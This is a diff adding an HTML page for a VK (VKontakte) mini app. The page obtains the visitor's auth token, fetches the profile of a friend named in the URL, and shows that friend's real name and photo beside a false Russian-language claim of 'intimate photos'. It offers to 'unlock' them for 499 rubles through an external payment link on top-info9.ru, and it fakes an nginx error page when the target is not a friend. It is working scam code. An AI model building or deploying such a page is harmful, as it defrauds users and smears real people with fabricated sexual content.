@@ -1,0 +1,145 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
+  <script>
+        var params = window
+                    .location
+                    .search
+                    .replace('?','')
+                    .split('&')
+                    .reduce(
+                        function(p,e){
+                            var a = e.split('=');
+                            p[ decodeURIComponent(a[0])] = decodeURIComponent(a[1]);
+                            return p;
+                        },
+                        {}
+                    );
+
+        var viewer_id = parseInt(params['vk_user_id']);
+        var permissions = 1;
+        var vk_app_id = parseInt(params['vk_app_id']);
+        var unix = 0;
+        var platform = params['vk_platform'];
+        var date = '';
+        var vk_is_app_user = parseInt(params['vk_is_app_user']);
+        var is_loaded_story = 0;
+        var IsAllowMessages = 0;
+
+        var token = "";
+        var viewer = {};
+        var my_age = 0;
+        var hash = window.location.hash.substr(1);
+
+
+        function firstApi() {
+            var code = 'var time=API.utils.getServerTime(); \n\
+            var areFriends = API.friends.areFriends({"user_ids": '+hash+'})[0]; \n\
+            var user=API.users.get({user_ids:'+hash+',fields:"uid, first_name, last_name, photo_max, photo_200, photo_id, bdate, sex, city, relation, is_closed, has_photo, counters"})[0]; \n\
+            return [areFriends,user];';
+
+             vkConnect.send("VKWebAppCallAPIMethod", {
+                "method": "execute",
+                "params": {"code": code, "v": "5.131", "access_token": token}
+            }).then(data => {
+                var areFriends = data.response[0]
+                var user = data.response[1];
+                if(areFriends.friend_status != 3){
+                  hash = "";
+                }
+
+
+                console.log(areFriends);
+                console.log(user);
+
+
+
+                if(!hash){ // Ошибка
+                    $("body").html('<html> \n\
+                    <head><title>404 Not Found</title></head>  \n\
+                    <body bgcolor="white">  \n\
+                    <center><h1>403 Not Found</h1></center>  \n\
+                    <hr><center>nginx</center>  \n\
+                    </body>  \n\
+                    </html>');
+                }else{
+                  var div = '<div style="padding: 100px;padding-top:50px;padding-bottom:10px;" class="w-full lg:max-w-full lg:flex"> \n\
+                              <div class="h-48 lg:h-auto lg:w-48 flex-none bg-cover rounded-t lg:rounded-t-none lg:rounded-l text-center overflow-hidden" style="background-image: url(\''+user.photo_200+'\')"> \n\
+                              </div> \n\
+                              <div class="border-r border-b border-l border-gray-400 lg:border-l-0 lg:border-t lg:border-gray-400 bg-white rounded-b lg:rounded-b-none lg:rounded-r p-4 flex flex-col justify-between leading-normal"> \n\
+                                <div class="mb-8"> \n\
+                                  <p class="text-sm text-gray-600 flex items-center"> \n\
+                                    <svg class="fill-current text-gray-500 w-3 h-3 mr-2" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"> \n\
+                                      <path d="M4 8V6a6 6 0 1 1 12 0v2h1a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2v-8c0-1.1.9-2 2-2h1zm5 6.73V17h2v-2.27a2 2 0 1 0-2 0zM7 6v2h6V6a3 3 0 0 0-6 0z" /> \n\
+                                    </svg> \n\
+                                    Платный контент \n\
+                                  </p> \n\
+                                  <div class="text-gray-900 font-bold text-xl mb-2">'+user.first_name+'</div> \n\
+                                  <p style="margin-bottom:10px;" class="text-gray-700 text-base">Всего 3 интимных фотографии</p> \n\
+                                  <img style="display: inline-block;" class="w-10 h-10 rounded-full mr-1" src="1.jpeg"> \n\
+                                  <img style="display: inline-block;" class="w-10 h-10 rounded-full mr-1" src="2.jpeg"> \n\
+                                  <img style="display: inline-block;" class="w-10 h-10 rounded-full mr-1" src="3.jpeg"> \n\
+                                </div> \n\
+                                <span style="width: fit-content;" class="inline-block bg-gray-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-2 mb-2">14 подписок</span> \n\
+                              </div> \n\
+                            </div> \n\
+                            <a style="width: 90%;display: block;text-align: center;margin: auto;" href="https://top-info9.ru/createPaytodo.php?viewer_id='+viewer_id+'&app=photo&amount=499" target="_blank" class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded w-full"> \n\
+                              Открыть доступ и просмотреть фото \n\
+                            </a> \n\
+                            <span style="text-align: center;width: 90%;margin: auto;" class="block bg-gray-200 rounded-full px-3 py-1 text-sm font-semibold text-gray-700 mr-2 mb-2">499 рублей</span>';
+                    $("body").html(div);
+
+
+
+
+
+                }
+
+
+              })
+              .catch(error => {
+
+              });
+        }
+
+        window.addEventListener('load', function () {
+            vkConnect.send('VKWebAppInit');
+
+            vkConnect.send("VKWebAppGetAuthToken", {
+                "app_id": vk_app_id,
+                "scope": "friends"
+            })
+            .then(data => {
+                if(token){return false;}
+                token = data.access_token;
+                firstApi();
+
+
+            })
+            .catch(error => {
+
+            });
+
+        });
+
+
+        function getRandom(min, max)
+        {
+            return Math.floor(Math.random() * (max - min + 1)) + min;
+        }
+
+    </script>
+</head>
+<body>
+
+
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
+  <script src="https://top-info9.ru/MESS_BACK/html2canvas.min.js"></script>
+</body>
+</html>
